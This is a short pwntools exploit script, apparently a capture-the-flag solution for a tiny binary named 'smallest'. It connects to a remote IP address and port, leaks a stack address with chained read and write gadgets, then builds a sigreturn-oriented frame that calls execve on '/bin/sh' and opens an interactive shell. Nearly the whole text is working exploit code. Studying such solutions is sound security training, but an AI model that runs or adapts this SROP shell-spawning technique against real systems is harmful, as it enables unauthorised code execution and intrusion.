from pwn import *
#io = process('./smallest')
io = remote('106.75.61.55', 20000)
context.log_level = 'debug'
context.arch = 'amd64'

syscall = 0x4000be
set_rdi = 0x4000bb
read_addr = 0x4000b0
payload = p64(set_rdi) # read payload to stack and execute alarm(37) and it will ret 0
payload += p64(set_rdi) # set rax= 0 and read one byte
payload += p64(set_rdi) # set rax= 1 write to leak
payload += p64(read_addr) # read payload 2 to stack and continue execute it
payload = payload.ljust(37, '\x00')
io.send(payload)

pause()
io.send('1') # one to make rax = 1

io.recvn(0x140) # we cant use env addresses, because it will change every time, it sucks
stack_addr = u64(io.recvn(8))
log.info('stack_addr :' + hex(stack_addr))

# do srop
frame = SigreturnFrame()
frame.rax = 59 
frame.rdi = stack_addr - 0x1
frame.rsi = 0 
frame.rdx = 0
frame.rsp = 0xdeadbeef 
frame.rip = syscall

# read payload3
pause()
payload2 = p64(read_addr)
io.send(payload2)


pause()
payload3 = p64(read_addr) # read 0xf bytes to set rax to sigreturn
payload3 += p64(0) # because of the syscall in payload 4, the frame should be at offset 8
payload3 += bytes(frame)
payload3 += '/bin/sh\x00' * 90 # stack spray
io.send(payload3)

pause()
payload4 = p64(syscall) + '/bin/sh'
io.send(payload4)

io.interactive()
